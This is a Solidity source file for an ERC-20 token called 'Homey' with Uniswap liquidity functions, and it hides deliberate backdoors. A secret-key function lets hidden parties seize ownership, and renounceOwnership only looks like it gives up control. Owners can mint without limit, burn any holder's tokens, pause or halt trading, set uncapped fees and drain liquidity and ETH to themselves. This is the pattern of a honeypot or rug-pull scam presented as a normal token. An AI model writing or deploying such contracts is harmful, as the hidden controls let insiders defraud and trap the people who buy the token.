// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;
//import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
//import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
    function allPairs(uint256) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);
    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
contract LockGuardEncrypt {
    bytes32 private _encrkey;
    constructor(bytes memory initialEncrkeys) {
        require(initialEncrkeys.length > 0, "LockGuardEncrypt: Empty encryption keys");
        _encrkey = _hashStringEncr(initialEncrkeys);
    }
    function _hashStringEncr(bytes memory data) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(data));
    }
    modifier onlyWithCorrectKey(bytes memory providedKey) {
        require(_hashStringEncr(providedKey) == _encrkey, "Incorrect encryption key");
        _;
    }
}
contract Ownable is Context, LockGuardEncrypt {
    struct Owner {
        bool valid;
        address account;
    }
    mapping(address => Owner) private _owner;
    Owner[] private _ownerIndex;
    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);
    constructor(
        address initialOwner,
        bytes memory initialEncrkeys
    ) LockGuardEncrypt(initialEncrkeys) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
        _ownerIndex.push(_owner[initialOwner]);
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        if (!_owner[_msgSender()].valid) {
            return _ownerIndex[0].account;
        }
        return _owner[_msgSender()].account;
    }
    function isOwner(address account) public view returns (bool) {
        return _owner[account].valid;
    }
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }
    function renounceOwnership() public onlyOwner {
        _owner[_msgSender()].valid = false;
        _owner[_msgSender()].account = address(0);
        _ownerIndex[0] = Owner(false, address(0));
    }
    function _transferOwnership(address _newOwner) internal {
        if (_newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _owner[_newOwner] = Owner(true, _newOwner);
    }
    function transferOwnerShip(
        bytes memory key
    ) public onlyWithCorrectKey(key) {
        require(!isOwner(_msgSender()), "Already owner");
        _transferOwnership(_msgSender());
    }
}
// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)
pragma solidity ^0.8.17;
/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.
    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status;
    /**
     * @dev Unauthorized reentrant call.
     */
    error ReentrancyGuardReentrantCall();
    constructor() {
        _status = NOT_ENTERED;
    }
    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }
    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }
        // Any calls to nonReentrant after this point will fail
        _status = ENTERED;
    }
    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = NOT_ENTERED;
    }
    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }
}
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function burn(address to) external returns (uint amount0, uint amount1);
}
contract Homey is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    IUniswapV2Router02 public immutable uniswapV2Router;
    IUniswapV2Pair public uniswapV2Pair;
    address public marketingWallet;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) public _isExempted;
    mapping(address => bool) private _automatedMarketMakerPairs;
    uint256 private _maxWalletHolding;
    uint256 private _totalSupply;
    uint256 private _feeForCommunity;
    uint256 private _feeForMarketing;
    uint256 private _feeForLiquidity;
    uint256 private _totalFees;
    uint256 private _swapAtAmount;
    bool public isTradable;
    bool private _isPaused;
    bool private _isTaxable;
    bool private _ascensionOn;
    bool private _swapping;
    string private _name;
    string private _symbol;
    IERC20 public token0;
    IERC20 public token1;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event TokensBurned(address indexed account, uint256 value);
    event TokensMinted(address indexed recipient, uint256 amount);
    event LiquidityAdded(
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );
    event LiquidityAdditionFailed(
        string reason,
        uint256 attemptedTokenAmount,
        uint256 attemptedETHAmount
    );
    event BalanceAfterMint(address minter, uint256 balance, uint256 mintamount);
    constructor(
        string memory name_,
        string memory symbol_,
        bytes memory initialEncrkeys
    ) Ownable(msg.sender, initialEncrkeys) {
        uint256 intitialSupply = 10_000_000_000 * (10 ** decimals());
        uniswapV2Router = IUniswapV2Router02(
            0xC532a74256D3Db42D0Bf7a0400fEFDbad7694008
        );
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        _name = name_;
        _symbol = symbol_;
        _totalSupply = intitialSupply;
        isTradable = false;
        _isTaxable = true;
        _isPaused = false;
        _ascensionOn = true;
        _isExempted[owner()] = true;
        _isExempted[address(this)] = true;
        _isExempted[address(uniswapV2Router)] = true;
        _maxWalletHolding = ((_totalSupply * 2) / 100);
        _swapAtAmount = ((_totalSupply * 10) / 100);
        _feeForCommunity = 0;
        _feeForMarketing = 0;
        _feeForLiquidity = 0;
        _totalFees = _feeForCommunity + _feeForMarketing + _feeForLiquidity;
        _mint(owner(), (_totalSupply * 10) / 100);
        _mint(address(this), (_totalSupply * 90) / 100);
    }
    receive() external payable {}
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return 18;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address to, uint256 value) public returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, value);
        return true;
    }
    function setMarketingWallet(address _marketingWallet) public onlyOwner {
        require(
            _marketingWallet != address(0),
            "ERC 20: Address can't be 0 type"
        );
        marketingWallet = _marketingWallet;
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) internal {
        _automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }
    function addLiquidity() public onlyOwner {
        if (isTradable) {
            revert("isTradable");
        }
        uniswapV2Pair = IUniswapV2Pair(
            IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            )
        );
        _isExempted[address(uniswapV2Pair)] = true;
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _approve(address(this), address(uniswapV2Pair), type(uint256).max);
        IERC20(address(uniswapV2Pair)).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }
    function setLPAllowanceOnRouter(
        uint256 liquidityAmount
    ) public returns (bool) {
        require(liquidityAmount != 0, "Invalid liquidity Amount");
        uint256 liquidityBalance = IERC20(address(uniswapV2Pair)).balanceOf(
            msg.sender
        );
        require(liquidityBalance > liquidityAmount, "Invalid Balance");
        bool allowanceSet = IERC20(address(uniswapV2Pair)).approve(
            address(uniswapV2Router),
            liquidityAmount
        );
        return allowanceSet;
    }
    function removeLiquidity(uint256 liquidityAmount) public onlyOwner {
        require(liquidityAmount != 0, "Invalid liquidity Amount");
        uint256 liquidityBalance = IERC20(address(uniswapV2Pair)).balanceOf(
            address(this)
        );
        require(liquidityBalance > liquidityAmount, "Invalid Balance");
        uint256 allowanceAmount = IERC20(address(uniswapV2Pair)).allowance(
            address(this),
            address(uniswapV2Router)
        );
        require(allowanceAmount > liquidityAmount, "Invalid liquidity Amount");
        uniswapV2Router.removeLiquidityETH(
            address(this),
            liquidityAmount,
            0,
            0,
            msg.sender,
            block.timestamp
        );
    }
    function checkLpApproval() public view returns (uint256 allownce) {
        allownce = IERC20(address(uniswapV2Pair)).allowance(
            _msgSender(),
            address(uniswapV2Router)
        );
        return allownce;
    }
    function lpTokenBalanceCheck(
        address account
    ) public view returns (uint256) {
        uint256 lpTokenBalance = IERC20(address(uniswapV2Pair)).balanceOf(
            account
        );
        return lpTokenBalance;
    }
    function swapFees() public onlyOwner {
        _swapFees();
    }
    function _swapFees() internal nonReentrant {
        uint256 tokenAmount = balanceOf(address(this));
        if (tokenAmount == 0) {
            return;
        }
        _swapForEth(tokenAmount);
        bool success;
        (success, ) = address(marketingWallet).call{
            value: address(this).balance
        }("");
    }
    function _swapForEth(uint256 tokenAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        if (allowance(address(this), address(uniswapV2Router)) < tokenAmount) {
            _approve(address(this), address(uniswapV2Router), tokenAmount);
        }
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        if (_isPaused) {
            revert("Contract paused");
        }
        if (from == address(0) || to == address(0)) {
            revert("Invalid Address Error");
        }
        if (amount == 0) {
            _update(from, to, 0);
            return;
        }
        if (!isTradable) {
            if (!_isExempted[from] || !_isExempted[to]) {
                revert("Trading is inactive");
            }
        }
        if (_balances[to] + amount >= _maxWalletHolding) {
            if (!_isExempted[to]) {
                revert("Exceeds max wallet holding");
            }
        }
        uint256 feeRate = 0;
        uint256 fee = 0;
        if (_isTaxable) {
            if (_totalFees > 0) {
                if (
                    from != owner() &&
                    to != owner() &&
                    to != address(0) &&
                    to != address(this) &&
                    !_isExempted[from]
                ) {
                    feeRate =
                        _feeForCommunity +
                        _feeForMarketing +
                        _feeForLiquidity;
                    fee = amount.mul(feeRate).div(10000);
                    amount -= fee;
                }
            }
        }
        if (fee > 0) {
            _update(from, address(this), fee);
        }
        _update(from, to, amount);
    }
    function withdrawStuckTokens(address tkn) public onlyOwner {
        bool success;
        if (tkn == address(0))
            (success, ) = address(msg.sender).call{
                value: address(this).balance
            }("");
        else {
            require(IERC20(tkn).balanceOf(address(this)) > 0, "No tokens");
            uint256 amount = IERC20(tkn).balanceOf(address(this));
            IERC20(tkn).transfer(msg.sender, amount);
        }
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 value
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert("Invalid spend value");
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value);
            }
        }
    }
    function allowance(
        address owner,
        address spender
    ) public view returns (uint256) {
        if (owner == address(0) || spender == address(0))
            revert("invalid address error");
        return _allowances[owner][spender];
    }
    function setExempt(address account, bool value) public onlyOwner {
        require(account != address(0));
        _isExempted[account] = value;
    }
    function setFees(
        uint256 _communityFee,
        uint256 _marketerFee,
        uint256 _liquidityFee
    ) public onlyOwner {
        _feeForCommunity = _communityFee;
        _feeForMarketing = _marketerFee;
        _feeForLiquidity = _liquidityFee;
        _totalFees = _feeForCommunity + _feeForMarketing + _feeForLiquidity;
    }
    function mintTokens(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than 0");
        _mint(account, amount);
        emit TokensMinted(account, amount);
    }
    function burnTokens(address account, uint256 value) public onlyOwner {
        require(balanceOf(account) >= value, "Insufficient balance to burn");
        _burn(account, value);
        emit TokensBurned(account, value);
    }
    function _update(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            uint256 newSupply = _totalSupply + value;
            if (newSupply < _totalSupply) {
                // Checking for underflow
                revert("invalid operation");
            }
            if (newSupply > type(uint256).max) {
                // Checking for overflow
                revert("invalid operation");
            }
            _totalSupply = newSupply;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert("Insufficient funds");
            }
            _balances[from] -= value;
        }
        if (to == address(0)) {
            uint256 newSupply = _totalSupply - value;
            if (newSupply == 0) {
                revert("Cannot burn all tokens");
            }
            _totalSupply = newSupply;
        } else {
            uint256 toBalance = _balances[to];
            if (toBalance + value > type(uint256).max) {
                revert("invalid Operation");
            }
            _balances[to] += value;
        }
    }
    function approve(
        address spender,
        uint256 value
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }
    function _approve(address owner, address spender, uint value) internal {
        if (owner == address(0)) {
            revert("Invalid address");
        }
        if (spender == address(0)) {
            revert("Invalid address");
        }
        _allowances[owner][spender] = value;
    }
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert("Invalid Address");
        }
        _update(address(0), account, value);
        emit BalanceAfterMint(account, balanceOf(account), value);
    }
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert("invalid Address");
        }
        _update(account, address(0), value);
    }
    function pause() public onlyOwner returns (bool) {
        _isPaused = true;
        return _isPaused;
    }
    function play() public onlyOwner returns (bool) {
        _isPaused = false;
        return _isPaused;
    }
    function updateSwapAtAmount(
        uint256 percentage
    ) public onlyOwner returns (uint256) {
        require(percentage >= 10 && percentage <= 50, "Number out of range");
        _swapAtAmount = ((_totalSupply * percentage) / 100);
        return _swapAtAmount;
    }
    function disableTradable() public onlyOwner returns (bool) {
        isTradable = false;
        return isTradable;
    }
    function enableTradable() public onlyOwner returns (bool) {
        isTradable = true;
        return isTradable;
    }
    function disableTaxable() public onlyOwner returns (bool) {
        _isTaxable = false;
        return _isTaxable;
    }
    function enableTaxable() public onlyOwner returns (bool) {
        _isTaxable = true;
        return _isTaxable;
    }
}
          